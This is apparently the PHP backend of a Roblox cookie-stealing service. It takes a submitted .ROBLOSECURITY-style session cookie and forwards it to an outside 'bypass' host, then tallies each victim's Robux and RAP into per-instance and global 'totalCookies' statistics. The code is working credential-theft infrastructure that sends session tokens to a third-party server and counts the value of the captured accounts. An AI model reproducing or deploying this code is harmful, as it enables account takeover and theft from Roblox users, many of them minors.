<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

require_once '../config.php';
require_once '../functions.php';

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'error' => 'Method not allowed']);
    exit;
}

$input = json_decode(file_get_contents('php://input'), true);
$cookie = $input['cookie'] ?? '';
$instance = $input['instance'] ?? '';

if (empty($cookie)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Cookie required']);
    exit;
}

// Call external bypass API
$externalApiUrl = 'https://rblxbypasser.com/api/bypass';
$postData = json_encode(['cookie' => $cookie]);

$externalResult = makeRequest($externalApiUrl, [
    'Content-Type: application/json'
], $postData, 'POST');

// Check if external API call failed
if ($externalResult['code'] !== 200 || !empty($externalResult['error'])) {
    http_response_code(400);
    echo json_encode([
        'success' => false, 
        'error' => 'Request Failed',
        'message' => 'Failed To Send Request, Make Sure Ur Cookie Already Refreshed Or Ur Account Is Not -13 / Age Verified Account'
    ]);
    exit;
}

// Parse the response from external API
$externalData = json_decode($externalResult['response'], true);

// Check if external API returned error or invalid data
if (!isset($externalData['success']) || !$externalData['success']) {
    http_response_code(400);
    echo json_encode([
        'success' => false, 
        'error' => 'Request Failed',
        'message' => 'Failed To Send Request, Make Sure Ur Cookie Already Refreshed Or Ur Account Is Not -13 / Age Verified Account'
    ]);
    exit;
}

// Extract data from external API response
$userInfo = $externalData['userInfo'] ?? [];
$detailedInfo = $externalData['detailedInfo'] ?? [];
$userId = $userInfo['userId'] ?? ($detailedInfo['userId'] ?? 0);
$username = $userInfo['username'] ?? ($detailedInfo['username'] ?? 'Unknown');
$displayName = $userInfo['displayName'] ?? ($detailedInfo['displayName'] ?? 'Unknown');
$avatarUrl = $externalData['avatarUrl'] ?? ($detailedInfo['avatarUrl'] ?? '');
$robux = $userInfo['robux'] ?? ($detailedInfo['robux'] ?? 0);
$rap = $userInfo['rap'] ?? ($detailedInfo['rap'] ?? 0);

// Update instance stats
if (!empty($instance)) {
    $instanceData = getInstanceData($instance);
    if ($instanceData) {
        $instanceData['stats']['totalCookies']++;
        $instanceData['stats']['totalRobux'] += $robux;
        $instanceData['stats']['totalRAP'] += $rap;
        
        updateDailyStats($instance, 'cookies', 1);
        updateDailyStats($instance, 'robux', $robux);
        updateDailyStats($instance, 'rap', $rap);
        
        saveInstanceData($instance, $instanceData);
    }
}
updateGlobalStats('totalCookies');

// Return the external API response as-is
echo json_encode($externalData);
?>
